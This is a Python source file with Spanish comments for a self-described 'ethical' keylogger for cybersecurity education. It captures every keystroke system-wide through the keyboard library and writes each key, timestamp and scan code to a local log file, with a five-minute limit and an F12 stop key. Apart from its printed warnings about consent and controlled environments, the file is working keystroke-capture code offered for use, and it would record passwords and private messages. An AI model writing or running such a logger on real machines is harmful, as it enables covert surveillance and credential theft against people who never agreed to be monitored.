import keyboard
import threading
import time
from datetime import datetime
import os
import hashlib

class EthicalKeyLogger:
    """
    KeyLogger ético para fines educativos de ciberseguridad
    Solo debe usarse en ambientes controlados con consentimiento
    """
    
    def __init__(self, log_file="keystrokes.log", max_log_size=1000):
        self.log_file = log_file
        self.max_log_size = max_log_size
        self.is_logging = False
        self.keystrokes = []
        self.session_id = hashlib.md5(str(datetime.now()).encode()).hexdigest()[:8]
        
    def start_logging(self):
        """Inicia el registro de teclas de manera ética"""
        if self.is_logging:
            print("El keylogger ya está en ejecución")
            return
            
        self.is_logging = True
        self._write_log_header()
        print(f"[{datetime.now()}] KeyLogger Ético Iniciado - Sesión: {self.session_id}")
        print("ADVERTENCIA: Solo usar en ambiente controlado con autorización")
        
        # Hilo para monitorear teclas
        monitor_thread = threading.Thread(target=self._monitor_keys)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Hilo para guardar periódicamente
        save_thread = threading.Thread(target=self._periodic_save)
        save_thread.daemon = True
        save_thread.start()
        
    def stop_logging(self):
        """Detiene el registro de teclas"""
        self.is_logging = False
        self._save_keystrokes()
        print(f"[{datetime.now()}] KeyLogger Detenido - Total teclas: {len(self.keystrokes)}")
        
    def _monitor_keys(self):
        """Monitorea las teclas presionadas"""
        while self.is_logging:
            try:
                # Captura evento de tecla
                event = keyboard.read_event()
                
                if event.event_type == keyboard.KEY_DOWN:
                    key_data = {
                        'timestamp': datetime.now(),
                        'key': event.name,
                        'scan_code': event.scan_code
                    }
                    self.keystrokes.append(key_data)
                    
                    # Limitar tamaño en memoria
                    if len(self.keystrokes) > self.max_log_size:
                        self._save_keystrokes()
                        
            except Exception as e:
                print(f"Error en monitoreo: {e}")
                
    def _periodic_save(self):
        """Guarda las teclas periódicamente"""
        while self.is_logging:
            time.sleep(30)  # Guardar cada 30 segundos
            if self.keystrokes:
                self._save_keystrokes()
                
    def _save_keystrokes(self):
        """Guarda las teclas en el archivo de log"""
        if not self.keystrokes:
            return
            
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                for key_data in self.keystrokes:
                    timestamp = key_data['timestamp'].strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"{timestamp} | {key_data['key']} | ScanCode: {key_data['scan_code']}\n")
            
            print(f"[{datetime.now()}] Teclas guardadas: {len(self.keystrokes)}")
            self.keystrokes.clear()
            
        except Exception as e:
            print(f"Error guardando teclas: {e}")
            
    def _write_log_header(self):
        """Escribe encabezado ético en el log"""
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write("\n" + "="*50 + "\n")
            f.write(f"KEYLOGGER ÉTICO - SESIÓN: {self.session_id}\n")
            f.write(f"INICIO: {datetime.now()}\n")
            f.write("USO EXCLUSIVO EDUCATIVO - AMBIENTE CONTROLADO\n")
            f.write("="*50 + "\n")
            
    def analyze_keystrokes(self):
        """Analiza los patrones de tecleo (fines educativos)"""
        if not os.path.exists(self.log_file):
            print("No hay datos para analizar")
            return
            
        with open(self.log_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            
        total_keys = len([line for line in lines if '|' in line])
        enter_keys = len([line for line in lines if 'enter' in line.lower()])
        space_keys = len([line for line in lines if 'space' in line.lower()])
        
        print(f"\n--- ANÁLISIS DE TECLAS (Educativo) ---")
        print(f"Total teclas registradas: {total_keys}")
        print(f"Teclas ENTER: {enter_keys}")
        print(f"Teclas SPACE: {space_keys}")
        print(f"Archivo de log: {self.log_file}")

class KeyLoggerManager:
    """
    Gestor principal del keylogger ético
    """
    
    def __init__(self):
        self.keylogger = EthicalKeyLogger()
        
    def start_monitoring(self, duration_minutes=5):
        """Inicia monitoreo por tiempo limitado"""
        print("🔐 INICIANDO KEYLOGGER ÉTICO")
        print("DURACIÓN: 5 minutos (máximo educativo)")
        print("PRESIONE 'F12' PARA DETENER MANUALMENTE")
        
        self.keylogger.start_logging()
        
        # Configurar tecla de parada
        keyboard.add_hotkey('f12', self.stop_monitoring)
        
        # Temporizador automático
        timer = threading.Timer(duration_minutes * 60, self.stop_monitoring)
        timer.start()
        
    def stop_monitoring(self):
        """Detiene el monitoreo"""
        self.keylogger.stop_logging()
        keyboard.remove_hotkey('f12')
        self.keylogger.analyze_keystrokes()

# Ejemplo de uso ético
if __name__ == "__main__":
    print("=== KEYLOGGER ÉTICO PARA CIBERSEGURIDAD ===")
    print("SOLO USAR EN:")
    print("- Ambientes controlados")
    print("- Con autorización explícita")
    print("- Fines educativos")
    print("- Pruebas de penetración autorizadas")
    print("="*50)
    
    manager = KeyLoggerManager()
    
    try:
        manager.start_monitoring(duration_minutes=5)  # Solo 5 minutos máximo
        
        # Mantener el programa en ejecución
        while manager.keylogger.is_logging:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nInterrumpido por usuario")
        manager.stop_monitoring()
    except Exception as e:
        print(f"Error: {e}")
        manager.stop_monitoring()
